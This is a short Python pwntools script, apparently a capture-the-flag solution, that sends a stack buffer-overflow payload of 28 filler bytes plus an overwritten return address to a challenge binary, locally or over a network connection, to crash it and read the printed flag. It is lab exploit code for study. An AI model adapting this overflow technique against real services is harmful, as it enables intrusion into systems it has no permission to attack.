#!/usr/bin/env python3
from pwn import *
from sys import argv

def run():
	if len(argv) == 3:
		context.binary = "./vuln.elf"
		return remote(argv[1], argv[2])
	else:
		return process("./vuln.elf")

context.log_level = "error"

# PIE is enabled so there's not much we can do with address
# but the challenge uses a SIGSEV handler to print the flag
# anyway, so just throw some junk here. Really we didn't even
# need to be so particular of founding were EIP is anyway and
# could have just made a "roughly large enough" payload.
EIP = pack(0xFFFFFFFF)
payload = (b'A' * 28) + EIP

with open("payload", "wb") as payloadFile:
	payloadFile.write(payload)

with run() as p:
	p.recvuntil(b':')
	p.sendline(payload)

	flag = p.recvall().strip().decode("ascii")

info(f"The flag is: {flag}")
print(flag)

